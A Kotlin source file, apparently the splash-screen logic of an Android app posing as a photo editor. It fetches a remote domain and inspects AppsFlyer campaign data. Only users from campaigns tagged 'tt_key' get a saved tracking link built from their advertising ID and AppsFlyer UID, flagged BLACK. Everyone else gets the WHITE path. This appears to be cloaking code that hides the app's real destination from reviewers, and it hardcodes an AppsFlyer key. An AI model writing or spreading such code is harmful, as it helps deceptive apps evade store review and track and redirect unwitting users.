package com.artstudio.photoeditor.activity.splash

import android.app.Application
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.MutableLiveData
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.artstudio.photoeditor.App
import com.artstudio.photoeditor.Utils.PreferenceProvider
import com.artstudio.photoeditor.Utils.URLMaker
import com.artstudio.photoeditor.Utils.Variables.context
import com.artstudio.photoeditor.Utils.db.DBCallbaks
import com.artstudio.photoeditor.Utils.db.DBWorker
import com.google.firebase.analytics.FirebaseAnalytics

class  SplashVM (application: Application) : AndroidViewModel(application) {


    private val CAMPAIGN_TAG = "campaign"
    val FB_PATH = "by"
    private val KEY_WORD = "tt_key"
    private val ADVERT_ID = "advertising_id"

    private var status: MutableLiveData<Int>? = null

    private var isStartedOpen = false
    private var isStartedAps = false


    private var domain = ""
    private var naming = ""
    private var gadid = ""




    private var appContext: App
        get() = getApplication<App>()
        set(value) {}

    fun getStatusLD(): MutableLiveData<Int> {
        if (status == null) {
            status = MutableLiveData()
            startVerification()
            startAps()
        }
        return status!!
    }

    private fun startVerification() {
        if (PreferenceProvider.getUrl() == PreferenceProvider.EMPTY_URL) {
            DBWorker.requestPercent(FB_PATH, object : DBCallbaks {

                override fun onSuccess(url: String) {
                    domain = url
                    goNext()
                }

                override fun onError() {
                    status!!.postValue(WHITE)
                }
            })
        } else {
            status!!.value = BLACK
        }
    }

    private fun goNext() {
        if (domain != "" && naming != "" && gadid != "") {
            if (!isStartedOpen) {
                isStartedOpen = true
                if (naming.contains(KEY_WORD)) {
                    var afid = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)
                    var url = URLMaker.createLink(naming, domain, gadid, afid)
                    PreferenceProvider.saveUrl(url)
                    this.status!!.postValue(BLACK)
                } else {
                    status!!.postValue(WHITE)
                }
            }
        }
    }

    private fun startAps() {
        if (!isStartedAps) {
            isStartedAps = true
            val conversionDataListener = object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                    data?.let { cvData ->
                        cvData.map {
                            Log.e("LOL", "conversion_attribute:  ${it.key} = ${it.value}")
                        }

                        naming = (data!![CAMPAIGN_TAG] ?: "empty") as String
                        goNext()

                        gadid = (data!![ADVERT_ID] ?: "empty") as String
                        goNext()

                    }
                    FirebaseAnalytics.getInstance(context).logEvent("onConversionDataSuccess", null)
                }

                override fun onConversionDataFail(error: String?) {
                    //Log.e("LOL", "onConversionDataFail")
                    FirebaseAnalytics.getInstance(context).logEvent("onConversionDataFail", null)
                    status!!.postValue(WHITE)
                }

                override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                    //Log.e("LOL", "onAppOpenAttribution")
                    FirebaseAnalytics.getInstance(context).logEvent("onAppOpenAttribution", null)
                }

                override fun onAttributionFailure(error: String?) {
                    //Log.e("LOL", "onAttributionFailure")
                    FirebaseAnalytics.getInstance(context).logEvent("onAttributionFailure", null)
                    status!!.postValue(WHITE)
                }
            }

            AppsFlyerLib
                    .getInstance()
                    .init("fTHMhfusDFFptFAiXDJ2fU", conversionDataListener, appContext)
            AppsFlyerLib.getInstance().start(appContext)
        }
    }

    companion object {
        const val WHITE = 0
        const val BLACK = 1
    }
}